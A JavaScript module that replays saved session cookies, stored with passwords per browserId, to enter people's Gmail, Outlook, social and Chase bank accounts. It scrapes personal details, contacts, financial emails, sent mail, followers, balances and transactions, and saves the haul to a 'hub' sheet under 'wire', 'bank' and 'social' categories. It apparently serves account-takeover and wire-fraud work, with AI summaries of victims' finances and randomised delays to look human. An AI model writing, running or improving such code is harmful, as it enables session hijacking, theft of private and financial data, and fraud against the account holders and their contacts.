import logger from './logger.js';
import aiService from './aiService.js';
import { launchBrowserWithSession, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';

// ============================================================
// SMART EXTRACT ENGINE
// Re-attaches a saved browser session (cookieJSON) and extracts
// personal info, box summary, financial summary (AI), contacts
// (with pagination) and activities (AI) per account category.
// Results are persisted to the HUB sheet in a JSON column per
// category (wireExtract / bankExtract / socialExtract).
// ============================================================

const COOKIE_SHEET = 'cookie';
const HUB_SHEET = 'hub';

// Per-browserId in-flight guard so auto-extract and manual extract never race.
if (!globalThis.__extractInFlight) globalThis.__extractInFlight = new Set();
const getInFlight = () => globalThis.__extractInFlight;

export function isExtractInFlight(browserId) {
    return getInFlight().has(browserId);
}

const sleep = (ms) => new Promise(res => setTimeout(res, ms));

// ==================== Session Resolution ====================

export async function resolveSession(browserId) {
    const result = await getSheetDataApi(COOKIE_SHEET);
    if (!result.success) throw new Error(`Failed to read cookie sheet: ${result.error}`);
    const headers = result.headers;
    const browserIdIdx = headers.indexOf('browserId');
    if (browserIdIdx === -1) throw new Error('cookie sheet missing browserId column');
    const row = result.data.find(r => String(r[browserIdIdx]).trim() === String(browserId).trim());
    if (!row) throw new Error(`No cookie row found for browserId: ${browserId}`);

    const col = (key) => {
        const idx = headers.indexOf(key);
        return idx !== -1 ? row[idx] : null;
    };

    const email = col('email') || '';
    const domain = col('domain') || (email ? email.split('@')[1]?.toLowerCase() : '') || '';
    const platform = detectEmailPlatform(domain);
    const cookieJSON = col('cookieJSON') || col('cookie') || col('formattedCookie') || '';
    const password = col('password') || '';

    if (!cookieJSON) throw new Error(`No cookieJSON found for browserId: ${browserId}`);

    // Best-effort platform hint for SOCIAL/BANK rows, read from the stored
    // socials/banks arrays (e.g. [{ platform: 'instagram', ... }]).
    const safeParse = (val) => {
        if (!val) return [];
        if (typeof val === 'string') { try { return JSON.parse(val); } catch { return []; } }
        return Array.isArray(val) ? val : [];
    };
    const socials = safeParse(col('socials'));
    const banks = safeParse(col('banks'));
    const socialPlatform = socials[0]?.platform || socials[0]?.website || '';
    const bankPlatform = banks[0]?.bankName || banks[0]?.website || '';

    return {
        browserId,
        email,
        domain,
        platform,
        password,
        socialPlatform,
        bankPlatform,
        cookieJSON: typeof cookieJSON === 'string' ? cookieJSON : JSON.stringify(cookieJSON),
        category: col('category') || '',
    };
}

export function detectEmailPlatform(domain) {
    const d = String(domain).toLowerCase();
    if (d.includes('gmail') || d.includes('googlemail')) return 'gmail';
    if (d.includes('outlook') || d.includes('hotmail') || d.includes('live.com') || d.includes('msn') || d.includes('microsoftonline')) return 'outlook';
    return 'other';
}

// ==================== Generic DOM Helpers ====================

async function gotoRobust(page, url, timeout = 30000) {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout });
    await DOMHelpers.randomDelay(1500, 3000);
}

// ==================== Gmail / Outlook Personal Info ====================

const PERSONAL_INFO_SITES = {
    gmail: [
        'https://myaccount.google.com/personal-info',
        'https://myaccount.google.com/',
        'https://accounts.google.com/SignOutOptions',
    ],
    outlook: [
        'https://account.microsoft.com/profile',
        'https://account.microsoft.com/account',
    ],
};

async function extractPersonalInfo(page, platform) {
    const sites = PERSONAL_INFO_SITES[platform] || PERSONAL_INFO_SITES.gmail;
    let raw = '';
    for (const url of sites) {
        try {
            await gotoRobust(page, url);
            raw = await page.evaluate(() => document.body.textContent.trim().slice(0, 6000));
            if (raw.length > 50) break;
        } catch (e) {
            logger.warn(`[smartExtract] personal info nav failed ${url}: ${e.message}`);
        }
    }

    const domResult = await page.evaluate(() => {
        const pick = (selectors) => {
            for (const sel of selectors) {
                const el = document.querySelector(sel);
                if (el && el.textContent.trim()) return el.textContent.trim();
            }
            return '';
        };
        const name = pick(['h1', '[class*="name"]', 'header [class*="name"]']);
        const recoveryEmail = pick(['[href*="recovery"]', 'input[type="email"]']);
        const phone = pick(['[href*="phone"]', '[class*="phone"]']);
        return { name, recoveryEmail, phone, raw: document.body.textContent.trim().slice(0, 6000) };
    });

    let aiResult = null;
    try {
        aiResult = await aiService.inferAccountMetadata(raw || domResult.raw || '');
    } catch (e) {
        logger.warn(`[smartExtract] personalInfo AI failed: ${e.message}`);
    }

    return {
        name: domResult.name || aiResult?.name || '',
        recoveryEmail: domResult.recoveryEmail || aiResult?.recoveryEmail || '',
        phone: domResult.phone || aiResult?.phone || '',
        altEmails: aiResult?.altEmails || [],
        storageUsed: aiResult?.storageUsed || '',
        createdAt: aiResult?.createdAt || '',
    };
}

// ==================== Box Summary ====================

async function extractBoxSummary(page, platform) {
    const inboxUrl = platform === 'gmail'
        ? 'https://mail.google.com/mail/u/0/#inbox'
        : 'https://outlook.live.com/mail/0/inbox';
    try {
        await gotoRobust(page, inboxUrl);
    } catch (e) {
        logger.warn(`[smartExtract] box summary nav failed: ${e.message}`);
    }

    return await page.evaluate(() => {
        // Folders / labels from the left nav.
        const folders = [];
        const labels = [];
        if (window.location.hostname.includes('google')) {
            document.querySelectorAll('div[role="navigation"] [role="link"]').forEach(el => {
                const t = (el.textContent || '').trim();
                if (t && t.length < 40) folders.push(t);
            });
        } else {
            document.querySelectorAll('[class*="folder"], [class*="Folder"], [role="treeitem"]').forEach(el => {
                const t = (el.textContent || '').trim();
                if (t && t.length < 40) labels.push(t);
            });
        }
        const bodyText = document.body.textContent || '';
        const unreadMatch = bodyText.match(/(\d+)\s*(new|unread|unread email|unread emails)/i) ||
            bodyText.match(/(new|unread):?\s*(\d+)/i);
        const totalMatch = bodyText.match(/(\d[\d,]*)\s*(total)?\s*(messages|emails|conversations)/i);
        return {
            totalEmails: totalMatch ? parseInt(totalMatch[1].replace(/,/g, '')) || 0 : 0,
            unreadEmails: unreadMatch ? parseInt(unreadMatch[1].replace(/,/g, '')) || 0 : 0,
            folders: folders.slice(0, 30),
            labels: labels.slice(0, 30),
        };
    });
}

// ==================== Contacts (pagination) ====================

const CONTACTS_SITES = {
    gmail: 'https://contacts.google.com/',
    outlook: 'https://outlook.live.com/people/0/',
};

async function extractContacts(page, platform, maxContacts = 200) {
    const url = CONTACTS_SITES[platform] || CONTACTS_SITES.gmail;
    const contacts = [];
    const seen = new Set();

    try {
        await gotoRobust(page, url);

        for (let i = 0; i < 8; i++) {
            const batch = await page.evaluate(() => {
                const pick = (selectors) => {
                    for (const sel of selectors) {
                        const el = document.querySelector(sel);
                        if (el && el.textContent.trim()) return el.textContent.trim();
                    }
                    return '';
                };
                const out = [];
                const items = document.querySelectorAll('[role="listitem"], [class*="person"], [class*="contact-card"], [data-contact-id]');
                items.forEach(el => {
                    const name = pick(['[class*="name"]', 'h2', 'h3', 'span[class*="Name"]']);
                    const emailEl = el.querySelector('a[href*="mailto:"]');
                    const email = emailEl ? emailEl.getAttribute('href').replace('mailto:', '') : '';
                    const phoneEl = el.querySelector('a[href*="tel:"]');
                    const phone = phoneEl ? phoneEl.getAttribute('href').replace('tel:', '') : '';
                    const companyEl = el.querySelector('[class*="company"], [class*="org"]');
                    if (name || email) {
                        out.push({ name, email, phone, company: companyEl?.textContent?.trim() || '' });
                    }
                });
                return out;
            });

            for (const c of batch) {
                const key = (c.email || c.name || '').toLowerCase();
                if (!key || seen.has(key)) continue;
                seen.add(key);
                contacts.push({
                    name: c.name || '',
                    email: c.email || '',
                    lastInteractionDate: '',
                    relationshipSummary: '',
                    interactionCount: 0,
                    otherData: {
                        phoneNumbers: c.phone ? [c.phone] : [],
                        company: c.company || '',
                        notes: '',
                    },
                });
            }

            if (contacts.length >= maxContacts) break;

            // Scroll-based pagination for infinite-scroll lists, else next button.
            const prevCount = contacts.length;
            await page.evaluate(() => window.scrollBy(0, 1500));
            await sleep(1800);
            const nextBtn = await page.$('button[aria-label*="next"], [class*="next"] button, [role="button"][aria-label*="Next"]');
            if (nextBtn) {
                try { await nextBtn.click(); } catch (e) { /* noop */ }
                await sleep(1800);
            }
            if (contacts.length === prevCount && !nextBtn) break;
        }
    } catch (e) {
        logger.warn(`[smartExtract] contacts extraction failed: ${e.message}`);
    }

    return contacts.slice(0, maxContacts);
}

// ==================== Financial Summary (fast search + AI) ====================

const FINANCIAL_TERMS = ['invoice', 'payment', 'receipt', 'bank', 'transfer', 'paypal', 'zelle', 'venmo', 'transaction'];

function financialSearchUrl(platform, term) {
    if (platform === 'gmail') {
        return `https://mail.google.com/mail/u/0/#search/${encodeURIComponent(term)}`;
    }
    return `https://outlook.live.com/mail/0/search?query=${encodeURIComponent(term)}`;
}

async function collectEmailTexts(page, platform, maxEmails = 30) {
    const emails = [];
    const seen = new Set();

    for (const term of FINANCIAL_TERMS) {
        if (emails.length >= maxEmails) break;
        try {
            await gotoRobust(page, financialSearchUrl(platform, term));
            await sleep(1500);
            const hostname = platform === 'gmail' ? 'google.com' : 'outlook.live.com';
            const rows = await page.evaluate((host) => {
                const selectors = host.includes('google')
                    ? ['tr[role="row"]', '.zA', '.zE', '[role="row"]']
                    : ['[role="option"]', '[class*="messageListItem"]', '[class*="Conversation"]'];
                const items = [];
                for (const sel of selectors) {
                    document.querySelectorAll(sel).forEach(el => items.push(el));
                }
                const out = [];
                const seenInner = new Set();
                for (const el of items) {
                    const text = (el.textContent || '').trim().replace(/\s+/g, ' ');
                    if (!text || seenInner.has(text)) continue;
                    seenInner.add(text);
                    out.push(text);
                    if (out.length >= 15) break;
                }
                return out;
            }, hostname);

            for (const r of rows) {
                const key = r.slice(0, 120);
                if (seen.has(key)) continue;
                seen.add(key);
                emails.push(r);
                if (emails.length >= maxEmails) break;
            }
        } catch (e) {
            logger.warn(`[smartExtract] financial search failed for ${term}: ${e.message}`);
        }
    }

    return emails;
}

async function extractFinancialSummary(page, platform) {
    const emailTexts = await collectEmailTexts(page, platform, 30);

    let aiResult = null;
    try {
        aiResult = await aiService.extractFinancialSummaryAI(emailTexts);
    } catch (e) {
        logger.warn(`[smartExtract] financialSummary AI failed: ${e.message}`);
    }

    const combined = emailTexts.join('\n');
    const mentions = /(invoice|payment|receipt|bank|transfer|paypal|zelle|venmo|transaction)/i.test(combined);

    return {
        boxFinancialSummary: {
            mentionsOfTransactions: aiResult?.boxFinancialSummary?.mentionsOfTransactions ?? mentions,
            identifiedPaymentMethods: aiResult?.boxFinancialSummary?.identifiedPaymentMethods || [],
            potentialInvoiceCount: aiResult?.boxFinancialSummary?.potentialInvoiceCount || 0,
        },
        averageTransactionAmount: aiResult?.averageTransactionAmount ?? 0,
        lastTransactionDate: aiResult?.lastTransactionDate || '',
        pendingTransactionsCount: aiResult?.pendingTransactionsCount ?? 0,
        transactionBox: aiResult?.transactionBox ?? mentions,
    };
}

// ==================== Activities (AI, last 50 read+sent) ====================

async function collectRecentEmails(page, platform, limit = 50) {
    const emails = [];
    const seen = new Set();

    const views = platform === 'gmail'
        ? ['inbox', 'sent']
        : ['0/inbox', '0/sent'];

    for (const view of views) {
        if (emails.length >= limit) break;
        try {
            const url = platform === 'gmail'
                ? `https://mail.google.com/mail/u/0/#${view}`
                : `https://outlook.live.com/mail/${view}`;
            await gotoRobust(page, url);
            await sleep(1500);

            const hostname = platform === 'gmail' ? 'google.com' : 'outlook.live.com';
            const rows = await page.evaluate((host) => {
                const selectors = host.includes('google')
                    ? ['tr[role="row"]', '.zA', '.zE']
                    : ['[role="option"]', '[class*="messageListItem"]', '[class*="Conversation"]'];
                const out = [];
                const seenInner = new Set();
                for (const sel of selectors) {
                    document.querySelectorAll(sel).forEach(el => {
                        const text = (el.textContent || '').trim().replace(/\s+/g, ' ');
                        if (text && !seenInner.has(text)) { seenInner.add(text); out.push(text); }
                    });
                }
                return out.slice(0, 40);
            }, hostname);

            for (const r of rows) {
                const key = r.slice(0, 120);
                if (seen.has(key)) continue;
                seen.add(key);
                emails.push(r);
                if (emails.length >= limit) break;
            }
        } catch (e) {
            logger.warn(`[smartExtract] activities view failed ${view}: ${e.message}`);
        }
    }

    return emails;
}

async function extractActivities(page, platform, limit = 50) {
    const recentEmails = await collectRecentEmails(page, platform, limit);

    let aiActivities = [];
    try {
        aiActivities = await aiService.extractActivitiesAI(recentEmails);
    } catch (e) {
        logger.warn(`[smartExtract] activities AI failed: ${e.message}`);
    }

    if (Array.isArray(aiActivities) && aiActivities.length > 0) {
        return aiActivities.map(a => ({
            type: String(a.type || 'READ').toUpperCase(),
            on: a.on || '',
            to: a.to || '',
            subject: a.subject || '',
            summary: a.summary || '',
        })).slice(0, limit);
    }

    // Fallback: generic activities from raw text.
    return recentEmails.slice(0, limit).map(text => ({
        type: 'READ',
        on: '',
        to: '',
        subject: text.slice(0, 120),
        summary: text.slice(0, 200),
    }));
}

// ==================== WIRE Extractor ====================

async function extractWire(session) {
    const cookieJSON = session.cookieJSON;
    const platform = session.platform === 'gmail' || session.platform === 'outlook' ? session.platform : 'gmail';

    const { browser, page } = await launchBrowserWithSession(cookieJSON);
    try {
        const personalInfo = await extractPersonalInfo(page, platform);
        const boxSummary = await extractBoxSummary(page, platform);
        const contacts = await extractContacts(page, platform);
        const financialSummary = await extractFinancialSummary(page, platform);
        const activities = await extractActivities(page, platform, 50);

        return {
            timestamp: new Date().toISOString(),
            emailAddress: session.email,
            passwordHint: session.password ? 'stored' : null,
            personalInfo,
            boxSummary,
            ...financialSummary,
            contacts,
            activities,
            extractedFrom: platform,
            extractedAt: new Date().toISOString(),
        };
    } finally {
        await page.close().catch(() => {});
        await browser.close().catch(() => {});
    }
}

// ==================== SOCIAL Extractor ====================

async function extractSocial(session, username, explicitPlatform) {
    const cookieJSON = session.cookieJSON;
    const cookiePlatform = (session.socialPlatform || session.category || '').toLowerCase();
    const platformKey = (explicitPlatform || cookiePlatform || 'twitter').toLowerCase().trim();
    let config;
    try {
        config = getPlatformConfig(platformKey);
    } catch (e) {
        logger.warn(`[smartExtract] No extractor config for '${platformKey}', falling back to twitter`);
        config = getPlatformConfig('twitter');
    }

    const { browser, page } = await launchBrowserWithSession(cookieJSON);
    try {
        const profile = { followersCount: 0, followingCount: 0, lastPostDate: '', recentActivity: [], followers: [] };
        const account = {
            accountId: session.browserId,
            platform: platformKey,
            username: username || session.email,
            lastUsed: '',
            active: true,
            ipAddress: '',
            device: { userAgent: '', browser: '', os: '' },
            extractedDetails: profile,
            detailsExtractedFrom: '',
        };

        try {
            const profileUrl = config.profileUrl.replace('{username}', String(username || '').replace('@', ''));
            await gotoRobust(page, profileUrl);
            const extractor = getExtractor(platformKey, 'profile');
            if (extractor?.parseFunction) {
                const parseFunc = new Function('items', extractor.parseFunction);
                const elements = await page.$$(extractor.selector);
                const data = parseFunc(elements);
                profile.followersCount = parseCount(data?.stats?.followers);
                profile.followingCount = parseCount(data?.stats?.following);
                profile.lastPostDate = data?.recentTweets?.[0]?.url ? new Date().toISOString() : '';
                profile.recentActivity = (data?.recentTweets || []).slice(0, 5).map(t => ({
                    type: 'POST', on: '', text: t.text || '',
                }));
            }
        } catch (e) {
            logger.warn(`[smartExtract] social profile extraction failed: ${e.message}`);
        }

        try {
            if (config.followersUrl) {
                const followersUrl = config.followersUrl.replace('{username}', String(username || '').replace('@', ''));
                await gotoRobust(page, followersUrl);
                const extractor = getExtractor(platformKey, 'followers');
                if (extractor?.parseFunction) {
                    const followers = [];
                    const seen = new Set();
                    for (let i = 0; i < 5; i++) {
                        const parseFunc = new Function('items', extractor.parseFunction);
                        const elements = await page.$$(extractor.selector);
                        const batch = parseFunc(elements);
                        for (const f of batch) {
                            const key = f.username || f.name || f.email || '';
                            if (!key || seen.has(key)) continue;
                            seen.add(key);
                            followers.push({
                                username: f.username || f.name || '',
                                fullName: f.fullName || f.name || '',
                                profileUrl: f.profileUrl || '',
                                isFollowingYou: false,
                                email: f.email || '',
                                phone: f.phone || 0,
                                relationshipSummary: f.bio || '',
                            });
                        }
                        if (followers.length >= 100 || followers.length === 0) break;
                        await page.evaluate(() => window.scrollBy(0, 900));
                        await sleep(1800);
                    }
                    profile.followers = followers.slice(0, 100);
                }
            }
        } catch (e) {
            logger.warn(`[smartExtract] social followers extraction failed: ${e.message}`);
        }

        account.extractedDetails = profile;
        account.detailsExtractedFrom = config.profileUrl || '';
        return [account];
    } finally {
        await page.close().catch(() => {});
        await browser.close().catch(() => {});
    }
}

function parseCount(val) {
    if (typeof val === 'number') return val;
    if (!val) return 0;
    const s = String(val).toLowerCase();
    const m = s.match(/([\d.]+)\s*([kmb]?)/);
    if (!m) return 0;
    const n = parseFloat(m[1]);
    if (m[2] === 'k') return Math.round(n * 1000);
    if (m[2] === 'm') return Math.round(n * 1000000);
    if (m[2] === 'b') return Math.round(n * 1000000000);
    return Math.round(n);
}

// ==================== BANK Extractor ====================

const BANK_SITES = {
    chase: {
        loginUrl: 'https://chase.com',
        accountCard: "div[data-testid='account-card'], .account-card, [class*='account']",
        transactionRow: "tr[data-testid='transaction-row'], .transaction-row, [class*='transaction']",
    },
};

async function extractBank(session, explicitPlatform) {
    const cookieJSON = session.cookieJSON;
    const rawPlatform = explicitPlatform || session.bankPlatform || session.category || 'chase';
    const platformKey = String(rawPlatform).toLowerCase().trim();
    const bankConfig = BANK_SITES[platformKey] || BANK_SITES.chase;

    const { browser, page } = await launchBrowserWithSession(cookieJSON);
    try {
        const accounts = [];
        const transactions = [];

        try {
            await gotoRobust(page, bankConfig.loginUrl);
            accounts.push(...await page.evaluate((cardSel) => {
                const out = [];
                document.querySelectorAll(cardSel).forEach(card => {
                    const name = card.querySelector('h3, [class*="name"]')?.textContent?.trim() || '';
                    const balance = card.querySelector('[class*="balance"]')?.textContent?.trim() || 'N/A';
                    const number = card.querySelector('[class*="number"], [class*="accountNumber"]')?.textContent?.trim() || 'N/A';
                    if (name || balance !== 'N/A') out.push({ name, balance, number, type: 'CHECKING' });
                });
                return out;
            }, bankConfig.accountCard));

            const txnLinks = await page.$$("a[href*='transaction'], a[href*='activity']");
            if (txnLinks.length > 0) {
                await txnLinks[0].click().catch(() => {});
                await sleep(2500);
                transactions.push(...await page.evaluate((rowSel) => {
                    const out = [];
                    document.querySelectorAll(rowSel).forEach(row => {
                        const date = row.querySelector('[class*="date"]')?.textContent?.trim() || '';
                        const amount = row.querySelector('[class*="amount"]')?.textContent?.trim() || '';
                        const desc = row.querySelector('[class*="desc"], [class*="description"]')?.textContent?.trim() || '';
                        if (date || amount) out.push({ date, amount, description: desc });
                    });
                    return out;
                }, bankConfig.transactionRow));
            }
        } catch (e) {
            logger.warn(`[smartExtract] bank extraction failed: ${e.message}`);
        }

        // Normalize into the BankAccount[] shape the frontend BankExtractView expects.
        const toNum = (val) => {
            if (typeof val === 'number') return val;
            const m = String(val || '').replace(/[^0-9.\-]/g, '');
            const n = parseFloat(m);
            return isNaN(n) ? 0 : n;
        };
        const bankAccounts = accounts.length > 0
            ? accounts.map((acct, i) => ({
                accountId: String(acct.number || `${platformKey}-${i + 1}`),
                accountType: String(acct.type || 'CHECKING').toUpperCase(),
                accountNumber: acct.number || 'N/A',
                routingNumber: '',
                balance: toNum(acct.balance),
                currency: 'USD',
                lastTransactionDate: transactions[0]?.date || '',
                pendingTransactionsCount: 0,
                totalCredit: 0,
                totalDebit: 0,
                interestRate: undefined,
                transactions: transactions.map(t => ({
                    date: t.date,
                    type: /credit|\+/i.test(t.amount) ? 'CREDIT' : 'DEBIT',
                    amount: toNum(t.amount),
                    description: t.description,
                })),
                detailsExtractedFrom: bankConfig.loginUrl,
            }))
            : [{
                accountId: platformKey,
                accountType: 'CHECKING',
                accountNumber: 'N/A',
                routingNumber: '',
                balance: 0,
                currency: 'USD',
                lastTransactionDate: '',
                pendingTransactionsCount: 0,
                totalCredit: 0,
                totalDebit: 0,
                transactions: transactions.map(t => ({
                    date: t.date,
                    type: /credit|\+/i.test(t.amount) ? 'CREDIT' : 'DEBIT',
                    amount: toNum(t.amount),
                    description: t.description,
                })),
                detailsExtractedFrom: bankConfig.loginUrl,
            }];

        return bankAccounts;
    } finally {
        await page.close().catch(() => {});
        await browser.close().catch(() => {});
    }
}

// ==================== Orchestrator ====================

const EXTRACT_COLUMN = {
    wire: 'wireExtract',
    social: 'socialExtract',
    bank: 'bankExtract',
};

/**
 * Runs smart extraction for a browserId and persists the result to the HUB
 * sheet. Returns the normalized extract result.
 * @param {string} browserId
 * @param {string} category - 'WIRE' | 'SOCIAL' | 'BANK' (case-insensitive)
 * @param {string} [username] - social handle when available
 * @returns {Promise<{ success: boolean, category: string, data: object, column: string }>}
 */
export async function runSmartExtract(browserId, category, username, platform) {
    const cat = String(category || 'wire').toUpperCase();
    const key = cat === 'BANK' ? 'bank' : cat === 'SOCIAL' ? 'social' : 'wire';
    const column = EXTRACT_COLUMN[key];
    const inFlight = getInFlight();

    if (inFlight.has(browserId)) {
        throw new Error(`Extraction already in progress for browserId: ${browserId}`);
    }
    inFlight.add(browserId);
    logger.info(`[smartExtract] START browserId=${browserId} category=${cat} platform=${platform || 'auto'}`);

    try {
        const session = await resolveSession(browserId);

        let data;
        if (key === 'social') {
            data = await extractSocial(session, username || session.email, platform);
        } else if (key === 'bank') {
            data = await extractBank(session, platform);
        } else {
            data = await extractWire(session);
        }

        // Ensure the hub column exists before writing (updateSheetRowApi skips unknown headers).
        await ensureSheetColumns(HUB_SHEET, [column, `${column}At`]);
        const writeResult = await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, {
            [column]: JSON.stringify(data),
            [`${column}At`]: new Date().toISOString(),
        });

        if (!writeResult.success) {
            logger.error(`[smartExtract] Hub write failed for ${browserId}: ${writeResult.error}`);
            throw new Error(`Failed to persist extract to hub: ${writeResult.error}`);
        }

        logger.info(`[smartExtract] DONE browserId=${browserId} category=${cat} -> ${column}`);
        return { success: true, category: cat, data, column };
    } catch (e) {
        logger.error(`[smartExtract] FAILED browserId=${browserId} category=${cat}: ${e.message}`);
        throw e;
    } finally {
        inFlight.delete(browserId);
    }
}
